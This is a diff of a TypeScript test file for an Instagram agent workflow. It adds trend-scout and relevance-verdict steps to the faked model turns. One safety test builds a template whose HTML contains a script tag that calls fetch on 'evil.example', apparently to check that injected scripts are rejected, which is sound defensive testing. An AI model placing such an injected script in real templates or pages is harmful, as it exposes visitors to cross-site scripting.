@@ -10,6 +10,8 @@ import {
 } from "../src/workflow/create-instagram-agent-workflow.js";
 import type { InstagramCopyOutput } from "../src/workflow/types.js";
 import {
+  goodRelevanceVerdict,
+  goodTrendScoutOutput,
   fakeRenderCarousel,
   fakeRouterSequence,
   finalTurn,
@@ -70,10 +72,10 @@ describe("custom archetypes: authoring, safety, and promotion", () => {
     const store = new MemoryTemplateStore();
     const copy = withCustomArchetype();
     const router = fakeRouterSequence([
-      finalTurn(goodResearchOutput()),
+      finalTurn(goodTrendScoutOutput()), finalTurn(goodResearchOutput()),
       finalTurn(copy),
       finalTurn(goodImageVettingOutput()),
-      finalTurn(goodVisualQaOutput()),
+      finalTurn(goodRelevanceVerdict()), finalTurn(goodVisualQaOutput()),
     ]);
 
     const durableStore = new MemoryDurableStepStore();
@@ -111,10 +113,10 @@ describe("custom archetypes: authoring, safety, and promotion", () => {
     const store = new MemoryTemplateStore();
     const copy = withCustomArchetype({ bodyHtml: `<div><script>fetch('https://evil.example')</script>{{note}}</div>` });
     const router = fakeRouterSequence([
-      finalTurn(goodResearchOutput()),
+      finalTurn(goodTrendScoutOutput()), finalTurn(goodResearchOutput()),
       finalTurn(copy),
       finalTurn(goodImageVettingOutput()),
-      finalTurn(goodVisualQaOutput()),
+      finalTurn(goodRelevanceVerdict()), finalTurn(goodVisualQaOutput()),
     ]);
 
     const durableStore = new MemoryDurableStepStore();
@@ -174,8 +176,8 @@ describe("custom archetypes: authoring, safety, and promotion", () => {
     const store = new MemoryTemplateStore();
     const copy = withCustomArchetype();
     const revised = { ...copy, caption: `${copy.caption} (revised)` };
-    const draftTurns = (c: InstagramCopyOutput) => [finalTurn(c), finalTurn(goodImageVettingOutput()), finalTurn(goodVisualQaOutput())];
-    const router = fakeRouterSequence([finalTurn(goodResearchOutput()), ...draftTurns(copy), ...draftTurns(revised)]);
+    const draftTurns = (c: InstagramCopyOutput) => [finalTurn(c), finalTurn(goodImageVettingOutput()), finalTurn(goodRelevanceVerdict()), finalTurn(goodVisualQaOutput())];
+    const router = fakeRouterSequence([finalTurn(goodTrendScoutOutput()), finalTurn(goodResearchOutput()), ...draftTurns(copy), ...draftTurns(revised)]);
 
     const workflowFn = createInstagramAgentWorkflow({
       tools: { ...env.tools, "publish.renderCarousel": fakeRenderCarousel(env.tools["publish.renderCarousel"]!) },
@@ -225,7 +227,7 @@ describe("custom archetypes: authoring, safety, and promotion", () => {
         body: `Fresh sentence number ${i + 1} covering another aspect of the team's workflow changes without echoing earlier phrasing.`,
       })),
     };
-    const router2 = fakeRouterSequence([finalTurn(goodResearchOutput()), ...draftTurns(differentCopy)]);
+    const router2 = fakeRouterSequence([finalTurn(goodTrendScoutOutput()), finalTurn(goodResearchOutput()), ...draftTurns(differentCopy)]);
     const workflowFn2 = createInstagramAgentWorkflow({
       tools: { ...env.tools, "publish.renderCarousel": fakeRenderCarousel(env.tools["publish.renderCarousel"]!) },
       promptStore: makePromptStore(),
